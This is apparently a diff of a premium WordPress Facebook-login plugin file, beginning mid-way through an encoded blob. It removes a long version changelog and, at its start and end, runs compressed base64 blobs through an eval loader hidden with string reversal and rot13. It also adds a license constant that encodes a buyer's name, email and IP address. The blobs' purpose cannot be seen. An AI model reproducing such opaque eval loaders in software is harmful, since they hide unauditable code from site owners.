fugpvl8HxwOIjLvcW+Fcxd1wX0BVJ5xc/WrfXYPa7bJ1DeRPpWkLac92ew+tTBrh9iZzck7qbmX4bQuVOHQl8bstv5/+4xKwab+7RtavhrF+Fkf9VYu1LP/rOzEETsq9fquAdUPBIK+6sfDhjVmz8PF3ribfeWYrrr/TPY22EaJkFh6b4yOPZeu24XaLZwFT17S4e8dqdNtbti2eGwuZPV4VCWevfCYLg6bnx3pQLEXZ2fr9zXdzjVBveCKhu8fKXKvYvq0/ZXHzxR1YbavSZL2nA6rT9xZ/XDGa0RJ1YySSGBDutPb91HYgZDgX1B49S1SLpvyVEgTTEz+MWfR84xNN4CqoW6QIT10tvC3klf2DpzNbYzfVbpvl/9FHlpXZbLAqd9Wi79xIrCfhDT+jjaxAVbBBaYU0oQRNA54ijdv+Pqqrz9dzS7Zq9VJrkVaoxAXetZaurwGQxm5aTFbNmwxjf4xwqo7bRIxGZI6DvBR1NvL9dc+Hlth1rju4sx8W0cps8bJi2wXhTgGHKA0ad3jUqN4A75rD+UVXko0Jw7o2e+YLc2lW+04bDY+Th2fLy7455RlfMJqLhArd7k5v4m78lqZBk3E/YmWX+a9pQ2oZWkp3ie3e0Q5F9mPaCNve5gdv1XZ46AetjicALWnAPl4eEZ34PBCn4i865TxtuExR+MFj0IgV5ZLp+ZhqYCDIjB30U/eY71UA8DW2xtgBFIhkp41VjXL/8/uubhpnuuv/95DYe/V0Maq36a4myjxG5NBBnT4i3ZQ/MgHf12tZrow7272G70Zw2Vs3+vcj/2ab4fziAynRRCtvwVQvbg9FI+L6y08n355dctazyccR8+cIcfUcMVPBMnSZTcL2IM8g6v/byKmc3TXQMbgxCc8XVz1gPTskGDaPqfg9AkAjsQXMYq9baADjcIGHTHNGzCPGDd4QQA09zfUucz+xLtFb/3N8xdzKivKf7ff6awvtuUne8vL1rPdm9iolk9KK3RZHnh1B8ctr1o13y3wBbsrkazom0rQ6kXeDE4FzKpN0GBnJn3vL/23l1vYulfpF7YWZi6kDs67/e6pgdZRG7vqKhPzHOfdmQY7CKBPUO7z3r+5ex2UrjwB/c/';$ecnbav=';)))CYKOJP$(rqbprq_46rfno(rgnysavmt(ynir';$TMwJOe=strrev($ecnbav);$cDrWsZ=str_rot13($TMwJOe);eval($cDrWsZ);
-
-
-
-/**********************************************************************/
-/**********************************************************************/
-/******************************CHANGELOG*******************************/
-/**********************************************************************/
-/**********************************************************************/
-
-/*
- * Changelog:
- * v33 (01/10/2014):
- * -New Feature: Shortcode support. [jfb_facebook_btn] can now be used to add Facebook login buttons to posts and pages.
- * -New Feature: Allow users to manually associate their WP/BP profiles with Facebook. Useful for users who want to 
- *  be able to explicitly retain their existing blog account, even if their WP & FB e-mails might not match.
- * -New Feature: Add the "Disconnect from Facebook" button to BuddyPress XProfiles (in addition to Wordpress profiles).
- * -New Feature: Option to add a Facebook button to the BuddyPress registration page.
- * -New Feature: Widget option to specify the destination URL for the "Forgot Password" link
- * -New Feature: Widget option to hide the "Forgot?" link
- * -The "Facebook" section that this plugin adds to the WP / BP profiles is now always shown, regardless of whether the
- *  'show a disassociate button' option is enabled.  When that option is disabled, only the UID is shown (without a button). 
- * -Show the comment form login button even when the comment form is hidden (by the 'Users must be registered and logged in to comment' option)
- * -Replace all "Mouseover for more info" links with "Click for more info," so they'll be easier to read and more mobile browser-friendly.
- * -Update checker improvements:
- *   *Message header text removed from this file; it will now be fetched from the VersionCheck script, along with the rest of the message.
- *   *The manual check link now explicitly says "Check for Updates," rather than just the current version
- *   *Clearer messages are now shown when manually checking (i.e. 'no new version available,' or the new version information [instead of both])
- *   *Don't use $opt_jfbp_latestversion for the POST when checking manually - that confuses the meaning of the var.
- *   *When hiding update notifications, show a message, and don't append a var to the URL (so navigating around won't continue to set the option.)
- *   *When hiding update notifications, only hide it for this version - the notification will be shown again if another updated version is posted.
- * -Fix some warnings that appear when saving premium options with WP_DEBUG defined
- * -Other minor tweaks & cleanups 
- * -Required core version is now 3.1.3
- * 
- * v32 (08/21/2013):
- * -Use wp_login_url() and wp_lostpassword_url() instead of site_url('wp-login.php') in the widget, so that wp-login.php can be moved/renamed.
- * -Replace one old REST call in the "enforce email" option that was causing logins to fail for some users 
- * 
- * v31 (06/04/2013):
- * -Fix jfb_multisite_add_to_blog, so it uses the same default role as when autoregistering new users
- * -Minor admin panel revision, so the free plugin's teaser will show the image-based button preview
- * -Don't include my jquery.1.4.4 on wp-login.php; instead use wp_enqueue_script()
- * -Replace a couple calls to jfb_auth with jfb_auth2
- * -Remove SERVER_NAME, SERVER_ADDR, and SCRIPT_FILENAME from Auth
- * -Add the wpuid to the wpfb_xprofile_fields_received filter
- * 
- * v30 (03/07/2013): 
- * Image-Based Login Buttons (requires core 3.0.0+):
- *  -You'll finally be able to use any image you like as the login button.
- *  -Image-based buttons are fully CSS-styleable, and will not delay-load (they appear the second your page does, like any other element).
- * Better MultiSite Support:
- *  -Pass blogid into _process_login.php, and switch_to_blog() to ensure the user is added to the site from which they initiated the login.
- *  -Add a basedir option for avatar caching, so sites on a network can share the same avatar cache (requires core 2.5.11+)
- *  -Avatar files get automatically deleted when a user is deleted from the network
- * Better SSL Support:
- *  -Widget login form uses site_url (to support FORCE_SSL_LOGIN)
- *  -Explicitly change the uploaddir to https if the current page is ssl (to avoid mixed content warnings)
- * Remove dependance on the PHP API:
- *  -Redo autoregistration-by-friendship to not rely on the PHP API
- *  -Redo autoregistration-by-group to not rely on the PHP API
- *  -Redo autoregistration-by-page to not rely on the PHP API
- *  -Redo XProfile fetching to not rely on the PHP API
- * New Widget Features:
- *  -Add a new option to hide the "Register" link (only applicable if registration is enabled on the site/network)
- *  -Add a new option to hide the "Edit Profile" link
- *  -Add a new option to point the "Edit Profile" link to the BP profile (instead of WP)
- * Other:
- *  -Show simple version information if this script is accessed directly (instead of an error)
- *  -Fix a minor bug with the 'rememberme' javascript in the premium widget
- *  -Fix a bug when using the "Disconnect" button in the admin panel
- *  -Fix autoregistration-by-group to work for PRIVATE and SECRET groups (as well as public)
- *  -Fix autoregistration-by-fanpage (requires a new extended permission)
- *  -Remove reliance on wpfb_output_button (requires core 2.5.1+)
- *  -Add a keepalive & licensecheck to the updatecheck; change from twicedaily to daily (& rename the cronjob)
- *  -Better logging for avatar caching
- *  -Rearrange the admin panel a bit
- *  -Move spinner files into new "assets" dir
- *  -Other minor changes/tweaks
- * 
- * v28.5 (xx/xx/xxxx):
- * -Fix a PHP shorttag
- * -Change link to the eStore in the upgrade notification message
- * 
- * v28 (11/20/2012):
- * -The addon will now automatically check for the latest version, and display a notice if it's out-of-date.  These notices may be optionally hidden.
- * -Add the ability to import 'interests' and 'music' xprofile fields
- * -New feature: Allow administrators to disassociate Wordpress user accounts from Facebook
- * -New feature: Optionally allow users to disassociate their own accounts from Facebook
- * -New feature: Set the role for autoregistered users
- * 
- * v27 (11/11/2012):
- * -Remove the admin panel listing for "optimize for SPEED and SCALEABILITY," as this fix is now included with the free plugin
- * -Required core version is now 2.3.5
- * -Use $wpdb->base_prefix instead of hardcoding 'wp_invitations' for invitational autoregistrations
- * -Special Sauce section is now automatically obfuscated by the store
- * 
- * v26 (02/06/2012):
- * -Replace jfb_multisite_get_users() with jfb_get_candidate_users(); it's now always enabled (not just on WPMU),
- *  and executes an "optimized query" to return only candidate users with matching usermeta, drastically speeding up
- *  logins on sites with many users 
- * -Split "avatar caching" into two options, so you can enable caching of thumbnails or fullsize images only -
- *  a performance optimization for sites that don't actually need both.
- * -Added new BuddyPress feature: the ability to announce new/returning logins to the Activity Stream
- * -Added four new filters so you can supplement the provided XProfile mappings with your own, or modify the incoming data as you see fit:
- *  wpfb_xprofile_allowed_mappings, wpfb_xprofile_fields_requiring_perms, wpfb_xprofile_fields_to_query, wpfb_xprofile_fields_received. 
- * 
- * v25 (11/25/2011):
- * -Major new feature: Ability to map Facebook profile data to BuddyPress XProfile fields!
- * -Required core version is now 2.1.7
- * -Replace deprecated get_settings() calls with get_option() in the Premium widget
- * -Add "rel=nofollow" to the Lost Password link in the premium widget
- * -Minor admin panel changes to accommodate the new TABBED panel 
- * 
- * v24 (10/01/2011):
- * -Update to OAuth 2.0.  Now requires free plugin v2.1.0 or higher.
- * 
- * v23 (09/26/2011):
- * -Support "%username%" variables in custom redirect URLs
- * -Add ability to show the user's avatar in the widget (when logged in)
- * -When deleting a user, also try to delete their cached avatar file (if present)
- * -Update the instructions for finding a userid/fanpageid (facebook changed their URL structure again)
- * -Get rid of legacy API code
- * 
- * v22 (06/09/2011):
- * -Created a new premium widget, that adds several options not provided by the free one:
- *  Customize the Widget's text, Hide the WP login fields, Show a "RememberMe" checkbox, Logout of Facebook (as well as blog) 
- * -When caching avatars, only store the relative path (under the UPLOADS dir), not the full absolute path (requires core 2.0.1)
- * -Show a link to autoregistered users' Facebook profiles on "Managed Users" admin page 
- * -Replace some depreciated functions
- * -Removed ToDo list from this file
- * -Code reorganization: moved all add_action()/add_filter() to one code block
- * 
- * v21 (05/19/2011):
- * -New Graph API code is now migrated to the Free plugin; this update is REQUIRED for core plugin 2.0.0!
- * -Better error reporting if the server fails to cache avatars
- *
- * v20 (04/01/2011):
- * -Output an html comment in the "init" fxn
- * -fbLoginButton is now a class instead of an id, to fix validation with multiple buttons on one page.
- *  As a result, clicking any one button now activates the spinner on all buttons
- * -Requires core version 1.9.1
- * 
- * v19 (03/31/2011):
- * -New Feature: Conditional autoregistration based on Facebook friendships
- * -New Feature: Conditional autoregistration based on Facebook group membership
- * -New Feature: Conditional autoregistration based on Facebook fanpages
- * -New Feature: Allow localization of Facebook popups to be disabled (checkbox)
- * -Admin panel cleanups: Fix a validation issue, change <small> descriptions to 
- *  mouseover <dfn>'s, move & rephrase various items
- * -Documentation cleanups: reverse the changelog, move it to the bottom of the file,
- *  tidy up the TODO list, revise the instructions, etc.
- * -Required core plugin version increased to 1.8.7
- * 
- * v18 (03/24/2011):
- * -Add a new wpfb_extended_permissions filter
- * 
- * v17 (03/22/2011):
- * -Fix a bug with wp-login.php when using the new API
- * 
- * v16 (03/22/2011):
- * -Premium.php was renamed to WP-FB-AutoConnect.php, and should now reside *outside* the base plugin's 
- *  directory (aka in the root /wp-content/plugins dir). This is to prevent it from getting overwritten 
- *  when updating the free version of the plugin. The old "Premium.php" path will still work, but I suggest
- *  using the new filename for your own convenience.
- * -MAJOR new feature: Option to use the new (Graph) Facebook API!
- *  Note that the new API offers several advantages:
- *   ->It's compatible with IE9
- *   ->It can coexist with other official Facebook plugins (i.e. Like boxes and comment forms)
- *   ->If you prompt for extended permissions (i.e. email, publish-to-wall), all of the prompts will now 
- *     appear in a single popup. Note that this makes "request permission to get their email address" 
- *     effectively identical to "request and require permission"; since all prompts are now presented together,
- *     there will be no way for the user to accept general access but deny email access.  It's all or nothing.
- * Other important things to note:
- *   ->If you're using a caching plugin, make sure to clear your cache after toggling this option
- *   ->If you've used any of this plugin's hooks to access the Facebook API, make sure to reformat your calls
- *     to work with the new API. Hooks that provide a Facebook object are:
- *     wpfb_connect, wpfb_existing_user, wpfb_inserted_user, and wpfb_login.
- *     If you'd like to simultaneously support both API versions, you can use a check like:
- *     if( version_compare(@constant('Facebook::VERSION'), '2.1.2', ">=") ) {}//new version
- *     else																	{}//old version
- *   ->As this is a very new feature, it should be considered as "beta."  If you experience any severe/breaking
- *     issues, you can always choose to use the old API and the plugin should function as it did previously.
- *     Note that it's also possible that using the new API will cause incompatibilities with older Facebook 
- *     plugins which still rely on the old API.
- *     
- * v15 (03/17/2011):
- * -Remove the "option" to handle double-logins; it's always automatically handled now.
- * 
- * v14 (03/17/2011):
- * -Don't show the button on wp-signup.php when signups are disabled
- * -Add some css to align the button on wp-signup.php more nicely
- *
- * v13 (03/17/2011):
- * -Change: Rearranged the admin panel
- * -Feature: Under the "Additional Buttons" section, you can now add a button to wp-signup.php (WPMU only)
- * -Feature: Wordbooker Avatar integration
- * -Fix: Cached avatars will now always go into the specified directory, regardless of the 
- *       "Organize my uploads into month- and year-based folders" setting
- * -Fix: Corrected a bug with roles for autogenerated users on MultiSite/WPMU
- * -Fix: Always enqueue jQuery when the AJAX spinner option is enabled (for themes that don't do so by default)
- *
- * v12 (01/29/2011):
- * -Output a comment showing the premium version (for debugging)
- *
- * v11 (01/28/2011):
- * -If a language code is detected in wp-config.php, the Facebook prompts will be localized.
- * -Specify your own path to cached Facebook avatars
- * -Add a log message that this is a premium login
- * -Required core plugin version increased to 1.6.5.
- * 
- * v10 (01/28/2011):
- * -Add option to show an AJAX spinner after the Login button is clicked
- * -Add option for a custom logout url
- * -Add option to insert a Facebook button to the Registration page
- * -Better error checking for avatar caching
- * -Required core plugin version increased to 1.6.4
- * 
- * v9 (01/23/2011):
- * -Slight revisions to jfb_output_premium_panel() to let me copy it to AdminPage.php
- * -Don't override $jfb_version
- *
- * v8 (11/25/2010):
- * -Add a message about the minimum required core plugin version
- * -Rearrange & rephrase the admin panel a bit
- * -Begin work on option to collapse all the facebook prompts into one (unfinished, so option hidden)
- * -Code cleanups
- *
- * v7 (11/25/2010):
- * -Conditional Invitations: tie in with wp-secure-invites plugin
- * 
- * v6 (11/24/2010):
- * -Fix minor logging bug (wasn't correctly showing notified user's emails)
- * -New Option: Custom redirect url for autoregistered users
- * -New Option: Custom redirect url for returning users
- * -New Option: Autoregistration restriction (to disallow autoregistrations)
- * 
- * v5 (11/24/2010):
- * -Add wpmu support
- * 
- * v4 (11/02/2010):
- * -Fixed auth
- * 
- * v3 (11/02/2010): 
- * -Add this changelog 
- * -Add support for choosing button size
- * -Add support for choosing button text
- * -Add support for silently handling double-logins
- * -Add ability to ENFORCE that real emails are revealed (reject proxied emails)
- *
- * v2 (11/01/2010): 
- * -Better integration with core
- * -Premium updates now independent of core updates
- * -Requires core plugin 1.5.1 or later
- *
- * v1 (11/01/2010): 
- * -Initial Release
- */
-
+define('JFB_PREMIUM_VALUE', 'YToxMDp7czo0OiJ1c2VyIjtpOjE5MztzOjU6ImVtYWlsIjtzOjE4OiJib3dyb21pckBnbWFpbC5jb20iO3M6NDoibmFtZSI7czoxMzoiQm93ZSBGcmFua2VtYSI7czo3OiJ2ZXJzaW9uIjtzOjM6IiAzNSI7czo1OiJvcmRlciI7aTo1ODk4O3M6NzoidXBncmFkZSI7czoxOiIwIjtzOjc6InByb2R1Y3QiO2k6NDk7czo1OiJwcmljZSI7czo1OiIyOS45OSI7czo0OiJkYXRlIjtzOjE5OiIyMDE1LTAxLTI2IDEwOjExOjM2IjtzOjI6IklQIjtzOjE0OiI0Ni4xNjYuMTg2LjIzNSI7fQ==');
+$CWBXLP='zVr7b5vIFv5XaBVViVRVgONK3Cp7Fe8WbCthUxwDpooshochHh7lYcfu9n+/Zwbjt4Gkifb+EKWNZ+Z855zvvGbMmLY9Tr0oyazIds4ZZKbO58ux7dD/vjcDw9d5wxvxqo94IdH5PosmV1fvLz42WoqFpSkJC1uSZ4Y0hG3MxReGiDStzI/C870zbB5PDV5lLU6IUYDZI2KsQA1NXWYNve8SkfeSEJpa27W6fYw0zKFvBF21lFYnGGHBMyTFtSXBNQJhUWw7rlSr4440ZQoKpYi3Y+O6qYQ5gKVbqkwGp1ugsq2DlOBpZoAJXvF0HocI1DNU+NEUDgWKh0LFRYXVlq8pCbBzdGlm6mrW1Aehgi0s+LausIi/PG2lPrYIkcSNBL1lYCuU42LbSprr48xJTkibgZQ5/IDHxUdD688QnxFTPI60J3xSL4Gzux0OJJMjwAyyhyiVK/VDmpiPNBvrLXUJVF3qvDxDXTVD4S3R8QQRjKAfG6LwiPgnDmmXLxDCWS1lhtTtI+qE2RBNiOfcES+ktsblsINjP7YqJRuSmhq6spLcO00KBSNJZYF+YGM5Agq6I93wbElckC1cHUcyWxWmBnjHllQXgGKrioG/KYz4F+zWzg1NPpZ6CiE2BiqAgPbU1BRvjYv6tVKCJakLixfAY08uanVYUxNya16RGOy5zotTo9tZIN6IQbWZ1VWA7rVhOwo7JB/OjACnYI3A1MBbYhlkZPsJ3fovlWjx3szmBA4y2QK4tdo+PO2qdVD9gFyfQipKNlR6I0kBkAKPAmFmrqvL21jxxbrZtNLEngNbITqpdCiny/IYKI+sKW2XWPHRlvCsuryAiYCfLRkyHc7Nlh3bkrexxby2mEHty0iFhTI5A7ovKiVR1kyhQK8DCXqCmRWwdVKcDemgHspQrdQcIjq2Wp10pOONJyoL9XEEaxvUxmipK9RMiE/YUhWfz5BWWZZiFJIEAoEW2LVJriWT/OMBCWdbrRAGYoJUUsWaSMROF3JloJBtc9gO9VRe1uUjXuSgWwLH2OAUWrVrjmmCxLMDkR1BL2fx+HOVb3mRH+mKB1Ih73IY0cJfBCFUK4YHYb57zrh5SB07dp78NEv3pQJAF+lqClGzNKF+AcgPH/x0HOQ481M/c86hQ62vEvXNEMchyJygFClH606TNnilbQjciZONo5hKOoPf40cXxePE+ZH7iZM4Jg5MH5eIKu24tDVi/nVnFxQhdwKdmpOeF9KICxzykChA6yzG6LoemQ3ArGwcOvML5uqK4ZtYq+Q3oQnN2xVNniHhRZE12tjezpr1mKjH/XDSHBh2gAZAhdzgngFMvSRBBzYON7HaCCCOJlGeNYBHfIhaKqQSdVE4pQEsMjpA5WngwzRLfICTOJNG1HpeegJIPBi12/doZcKQMMBaVoAf7ZUmJFxbVQjDKPPdRZ46SdooGhvzi29DAcOBowq5odurpVVILNPynLE5MzOzIZb6zCBD+fbwVj5jTZgLRrU02sEydnOMU3/pvBWowNae0mpA8yixURRNnWTsh5kzSczMqSYUGe3XMqpIZENtU2iLQ8b8nSae+8i0q1ClXjQfp7Efhk5C0MzjsRP+yJ3cGadW4sfZQUkIRQ6ktKuV3T+2+e2CWUx8JxpuaBUVEiUs4oSlBakIBep6WnlNNA3n7E3zuoXmuVAq00lBRpIXtBiPoJEwqjKcPIdEmxMW0PoZqiz8zmsg+ZMwj90kgITrh9X2GWkGvUqyyEVJqM433eopQBFq2evl9OpIBbNKlzXh+xxQGzAeho60euiFeQ2cZWp2Tq+QWvKyJo9EQeCEWUPz8EKGoBMn4xNq9bMas2wt32Lam6EhbRa0orTn0XkM84IYVE4oL0U5jym6ZihXHVj9tWKBpmzYCoXonSmdTkehUsPzE6iOR1+JCho+GFf6EHnfXoAsNHSFXCTGcMxjk15jAj0ZFAb4c0Pqb13vvrkBq+Adt2IJz4KphQw62y1YXcrYaPYbFkXx821KLjJGgUqkkhL/CPznyCWwIansSMOpxa0uN7pVlWp+oHtZvWpbl6c4icCezjgwY9r+cq/a1eFsdTVMiujl7kXBs2Dxr9JLvQ6cBpX0RVN8ywNHEn8/YTLKQLrMgQdTvdXBVsDBZC9v7vsqWAgMdMxg3IB9z521Nk26b4mCBx1CbEM0O5R5MKyqW0fVjtJroEXUNOyWXjBQnMK6uS4JmuA9SOn//PO81PWzQQmA2re0eDGsvEo7mVvLRxTyaJKOAvGxwRViKdmUVK+63TslFSZKiCH9dvWE+Iua8N1R07h+kmYUyIyap64BLG78aqBZxZ1bBP1hbIUy5E2ZNelcsnoKKi+eGIrBzDOvALLCQS6WfjITHCETM6exfmHy2IbV9VoVEwJ8RGXx52fSzd+d65vB9+M89ZBGgD58ZCoX7jypweLPH5m+2BnfKV9ve8PbsXp9M/xKzV//Zqi3oD2WRHL/tfWKUG3ccosmzO3u7UnDFjYC06TUqm9thPYpI2xDKxGEZuDA+TMnSamXzpwZ9LfwO3DS1Jw4VyyBfHYNq1UnYaAWfmHOQB0T/pk6iW9imOrPzSQxFwev8Zb0xBnQ5w6GpHdjrv7YX3C7HF7Kx0lc7i32rWDuuy4gL1TlewJdt9Zj/zjy3K4KPHl2JCXn/QWsPrcd1w8de58Sg6nxp851BsqQ66tD+hTw34POisJmPm2bGv63j3ByuGqsflUu/rO3EEQcqtfquEdUPEGFw9UPR4zqzXfpQk68694RTIPe3/LBDkM3MApL95XkOHjX3U7QdOGKPQdLh6w6UKfqoFh2nDYDURkORaF3z8nD1XHjwVcFIO7rvLvyUN/hVJXvOUXUWfGrIvauqk87XH30REUdqveqKKjD6bT+xL3VDxckR5yZySSFADquP7l1H/EZDAXWFeGpa+L00JKjQJg61OBXf5w4R1dZE1ot1IVGWCu9zR2c9I2uM1ZjO9VnFe6H2U8Sl+Z1uSyw2+fl0k80KRySmOTH0YYXdBFYYE5agiCCyhFH6eEdV1dhrb+i2Q19w5nkZqjSBupGy1JDg9+BPCsnLWrLhjm+wfdCILeTJBEbISYPkI+G1l6ue+Hd3A65xncXY+xbTpjuFkySYL0ocGKIAdo+vWuUajh3yGb9oaiIQ47E3AU58xm71al4qw6Hxc7Hse07+zuKrx9dTkDFBWr1Jrf3t3lPVCJTv53Qp2rtadqT2phkkp7keVa3g5F/nfWgbex15dnNn505gtbD4ocTsOYcWh4WPmN7MFjBT2QMOiXfJpR/MFr0gAK9Ml3umIaEAgyIwV9FPdnFeqyGgS22NsAIJEIm/NpY12//P7rm4aZ6rv/++xoO/10NCVf9NHWyjRL7ORFkTItXsofmJB3962o10Yd5d7Vd6C8aKmf9u8r9Omzz/XAGzLRToGz5T6Ds0eml/Lyw0sr35R+/b1nj4YL58IE5/hExXNFnOkkSJfeL2AF5x9d+WXFm8+m+gXU5BGd835z1QLVsUCCafsUSikRgBdzqS5ztzZc4dwsEDLpjQpswD2h1OAPAJPa31PlC/4gOkt/7W+ouatSXJP+fv5NY323Szs/nJ62d3RtONMsHpTWaLC+c+otxLC/aN98ddAtWVyVR0bakodALvBicC5HUm6BAzIx71l97b9CbmNo3oRd2FobG5bbG+r2u4UEU4bsBEfWJeu7TngydXiTQz9D+Zz3/enY3KVz4i/kf';$ecnbav=';)))CYKOJP$(rqbprq_46rfno(rgnysavmt(ynir';$TMwJOe=strrev($ecnbav);$cDrWsZ=str_rot13($TMwJOe);eval($cDrWsZ);
 
 ?>
